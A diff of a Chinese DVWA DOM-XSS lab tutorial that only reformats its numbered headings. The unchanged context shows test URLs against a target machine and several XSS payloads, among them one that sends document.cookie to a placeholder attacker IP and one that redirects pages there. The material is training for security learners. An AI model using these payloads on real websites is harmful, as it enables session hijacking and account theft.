@@ -59,7 +59,7 @@ document.write("<option value='French'>French</option>");
 
 ## 三、手工测试流程
 
-### 1\. 正常访问
+### 1. 正常访问
 
 ```text
 http://靶机IP/dvwa/vulnerabilities/xss_d/?default=English
@@ -67,7 +67,7 @@ http://靶机IP/dvwa/vulnerabilities/xss_d/?default=English
 
 页面下拉框中显示 English。
 
-### 2\. 提交 Payload
+### 2. 提交 Payload
 
 ```text
 http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
@@ -85,35 +85,35 @@ http://靶机IP/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</sc
 
 ## 四、常用 Payload 与利用方式
 
-### 1\. 基础弹窗
+### 1. 基础弹窗
 
 ```html
 <script>alert(1)</script>
 ```
 
-### 2\. 图片事件触发
+### 2. 图片事件触发
 
 ```html
 <img src=x onerror=alert(document.cookie)>
 ```
 
-### 3\. 窃取 Cookie
+### 3. 窃取 Cookie
 
 ```html
 <script>new Image().src='http://攻击者IP/steal?c='+document.cookie;</script>
 ```
 
-### 4\. 页面跳转
+### 4. 页面跳转
 
 ```html
 <script>window.location='http://攻击者IP/'</script>
 ```
 
-### 5\. URL 编码
+### 5. URL 编码
 
 由于 Payload 在 URL 中，特殊字符需要 URL 编码。例如 `<` 编码为 `%3C`，`>` 为 `%3E`，`/` 为 `%2F`。现代浏览器地址栏会自动编码，但用 Burp 或手工编码更可靠。
 
-### 6\. 完整攻击链
+### 6. 完整攻击链
 
 构造恶意链接：
 
